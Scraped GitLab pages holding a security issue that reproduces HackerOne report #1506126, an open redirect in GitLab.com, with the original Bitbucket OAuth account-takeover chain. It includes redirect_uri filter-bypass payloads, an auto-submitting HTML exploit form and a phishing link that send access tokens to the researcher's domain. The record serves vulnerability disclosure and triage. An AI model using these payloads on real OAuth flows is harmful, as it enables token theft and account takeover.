=== Content from gitlab.com_9bcb6a9d_20250114_233738.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-2250.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-2250.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-2250.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-2250.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Jul 01, 2022

  [8bb02b78](/gitlab-org/cves/-/commit/8bb02b7893e590d43192378bdc04405f7a93649a)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/8bb02b7893e590d43192378bdc04405f7a93649a)
  ·
  8bb02b78

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jul 01, 2022

  8bb02b78

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/8bb02b7893e590d43192378bdc04405f7a93649a)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jul 01, 2022

Loading



=== Content from gitlab.com_ee7aaee3_20250114_233741.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Open Redirect Vulnerability

**[HackerOne report #1506126](https://hackerone.com/reports/1506126)** by `stealthy` on 2022-03-10, assigned to [@nmalcolm](/nmalcolm "Nick Malcolm"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

There is an open redirect on `https://gitlab.com/<whatever you want>/@@<attacker url>` which can be used to redirect unsuspecting users to a malicious location.

### What is an open redirect?

> Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.
>
> Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application's access control check and then forward the attacker to privileged functions that they would normally not be able to access.
>
> <https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html>

## Original Report

The original report shows how a BitBucket flaw can lead to BitBucket account takeover, but the HackerOne researcher and three appsec engineers were unable to turn it into a GitLab account takeover. That leaves just the open redirect.

 Click here to expand the original report
## GitLab-safe How To Reproduce

Don't use the researcher's infrastructure.

1. Create a fresh GitLab.com and BitBucket.org account, if you don't have test ones already
2. Visit `https://4a4e6bbf.gitlab.io/test` which [@nmalcolm](/nmalcolm "Nick Malcolm") created as a GitLab-controlled PoC
3. Observe the exposed authentication token

> `https://4a4e6bbf.gitlab.io/#access_token=>>REDACTED<<&scopes=project+wiki+pullrequest+issue+account&state=REDACTED&expires_in=7200&token_type=bearer`

The AppSec group have been added as maintainers to <https://gitlab.com/4a4e6bbf> so they can view / edit the PoC.

---

##### Summary

I bypassed Bitbucket OAuth login flow to harvest the token.

Here is a breakdown of the exploit.

This is the redirect\_uri parameter where `https://gitlab.com/users/auth/bitbucket/callback` is whitelisted.

```
redirect_uri=https://gitlab.com/users/auth/bitbucket/callback
```

[![Screen_Shot_2022-03-10_at_1.17.46_AM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/b685eb72cef9075d7057562e8708ca3f6408de10/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36616161623737622d646465382d346563362d623535362d3963333536666132326566382f53637265656e5f53686f745f323032322d30332d31305f61745f312e31372e34365f414d2e706e67)

However, some content is allowed after /callback. The problem is that slashes are blacklisted including the Apache colon trick.

* <https://gitlab.com/users/auth/bitbucket/callbackasdfsd> --> Allowed
* <https://gitlab.com/users/auth/bitbucket/callback/>.. --> Blocked
* <https://gitlab.com/users/auth/bitbucket/callback/>..; --> Blocked

However, the there is a bypass if the colon comes first. However, the server does not process this because anything after the colon is stripped.

* [https://gitlab.com/users/auth/bitbucket/callback;/../](https://gitlab.com/users/auth/bitbucket/callback%3B/../) --> Allowed

[![Screen_Shot_2022-03-10_at_1.24.00_AM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/b5a19e73f28508d16e6bfa1e047cfb8c08f074c4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33663439343531392d633139662d343339642d616132302d6234363639313839366361372f53637265656e5f53686f745f323032322d30332d31305f61745f312e32342e30305f414d2e706e67)

The malicious data needs to be URL encoded for this to work correctly. However, a URL encoded colon followed by the string `/../` is blocked. Additionally, the colon traversal trick `/..;/` will not work either. Different permutations with meaningless characters in between does not work either.

* [https://gitlab.com/users/auth/bitbucket/callback%3b/../](https://gitlab.com/users/auth/bitbucket/callback%3B/../) --> Blocked
* [https://gitlab.com/users/auth/bitbucket/callback%3b/..;/](https://gitlab.com/users/auth/bitbucket/callback%3B/..%3B/) --> Blocked
* [https://gitlab.com/users/auth/bitbucket/callback%3baaa/..;/](https://gitlab.com/users/auth/bitbucket/callback%3Baaa/..%3B/) --> Blocked
* [https://gitlab.com/users/auth/bitbucket/callback%3b/..;aaaa/](https://gitlab.com/users/auth/bitbucket/callback%3B/..%3Baaaa/) --> Blocked

Is this really solvable? Yes, there is a way using backslashes which are transformed into forward slashes later in the OAuth flow.

* [https://gitlab.com/users/auth/bitbucket/callback%3b......&](https://gitlab.com/users/auth/bitbucket/callback%3B......%26)

[![Screen_Shot_2022-03-10_at_1.28.59_AM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/8c062709d2906b4d0c4a6e3914bd8ac2da2ad292/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f66343465386261332d663832642d343466342d613039392d3936303438333163343632332f53637265656e5f53686f745f323032322d30332d31305f61745f312e32382e35395f414d2e706e67)

Now, I chain this with an open redirect and the have the following payload.

* https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback%3b%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjira%5c@[@]stealthy.com%5c

[![Screen_Shot_2022-03-10_at_1.30.32_AM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/6bd8531fc83693b1ecf3e967e02dd7a15c1a2b0e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33343761623339322d373139662d346436322d383066622d3962626430646363336236622f53637265656e5f53686f745f323032322d30332d31305f61745f312e33302e33325f414d2e706e67)

##### Steps to reproduce

1 - Go to GitLab login and click Log in with Bitbucket. Get the client\_id to verify the exploit is using GitLab's oauth.

2 - Visit my exploit server. `https://stealthybugs.com/xploit.html`

```
<html>
  <body>
<h1>Your GitLab Account will be compromised in 3.. 2.. 1.. </h1>
  <script>history.pushState('', '', '/')</script>
    <form id='exploit' action="https://bitbucket.org/site/oauth2/authorize">
      <input type="hidden" name="client&#95;id" value="b9jLmh8WCLZPBAwWba" />
      <input type="hidden" name="redirect&#95;uri" value="https&#58;&#47;&#47;gitlab&#46;com&#47;users&#47;auth&#47;bitbucket&#47;callback&#59;&#92;&#46;&#46;&#92;&#46;&#46;&#92;&#46;&#46;&#92;&#46;&#46;&#92;jira&#92;&#64;&#64;stealthybugs&#46;com&#92;" />
      <input type="hidden" name="response&#95;type" value="token" />
      <input type="hidden" name="state" value="06d3b35a33aef06beb856442ecc7e8ed15f948ec302ad857" />
<script>setTimeout(function(){ document.forms["exploit"].submit(); }, 3000);</script>
    </form>
  </body>
</html>
```

3 - Your authentication token is exposed.

4 - Additionally, you could just send someone a link.

```
https://bitbucket.org/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback%3b%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjira%5c@[@]stealthy.com%5c&response_type=token&state=06d3b35a33aef06beb856442ecc7e8ed15f948ec302ad857
```

##### Impact

Account takeover for accounts who have `Log in with Bitbucket` enabled. Also, any GitLab account who is using Bitbucket to repositories into GitLab will have their account compromised and source code/repositories compromised as well.

##### What is the current *bug* behavior?

[Screen\_Recording\_2022-03-10\_at\_1.33.22\_AM.mov](https://user-content.gitlab-static.net/a70bfe89484d984d2dbf784180bafa1cd8e34293/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64663537373762652d333464622d346166302d393231362d6563663336623735366433322f53637265656e5f5265636f7264696e675f323032322d30332d31305f61745f312e33332e32325f414d2e6d6f76 "Download 'Screen_Recording_2022-03-10_at_1.33.22_AM.mov'")

##### What is the expected *correct* behavior?

There should be a whitelisted URL redirect.

##### Output of checks

GitLab.com

#### Impact

Account takeover and the compromise of repositories and source code of clients using Bitbucket and Gitlab together.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Shot\_2022-03-10\_at\_1.17.46\_AM.png](https://h1.sec.gitlab.net/a/6aaab77b-dde8-4ec6-b556-9c356fa22ef8/Screen_Shot_2022-03-10_at_1.17.46_AM.png)
* [Screen\_Shot\_2022-03-10\_at\_1.24.00\_AM.png](https://h1.sec.gitlab.net/a/3f494519-c19f-439d-aa20-b46691896ca7/Screen_Shot_2022-03-10_at_1.24.00_AM.png)
* [Screen\_Shot\_2022-03-10\_at\_1.28.59\_AM.png](https://h1.sec.gitlab.net/a/f44e8ba3-f82d-44f4-a099-9604831c4623/Screen_Shot_2022-03-10_at_1.28.59_AM.png)
* [Screen\_Shot\_2022-03-10\_at\_1.30.32\_AM.png](https://h1.sec.gitlab.net/a/347ab392-719f-4d62-80fb-9bbd0dcc3b6b/Screen_Shot_2022-03-10_at_1.30.32_AM.png)
* [Screen\_Recording\_2022-03-10\_at\_1.33.22\_AM.mov](https://h1.sec.gitlab.net/a/df5777be-34db-4af0-9216-ecf36b756d32/Screen_Recording_2022-03-10_at_1.33.22_AM.mov)
### How to reproduce

Visit `https://gitlab.com/asdfwhatever/@@example.com` and note that you are redirected to `example.com`. The URL pattern is: `<instance_server>/<any value>/@@<malicious destination>`

```
~ curl -I "https://gitlab.com/asdasdasd/@@example.com?param1=abc&param2=xyz#somemore=stuff"
HTTP/2 301
date: Tue, 15 Mar 2022 06:26:55 GMT
content-type: text/html
content-length: 85
location: https://example.com
```

Edited Mar 15, 2022 by [Nick Malcolm](/nmalcolm)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


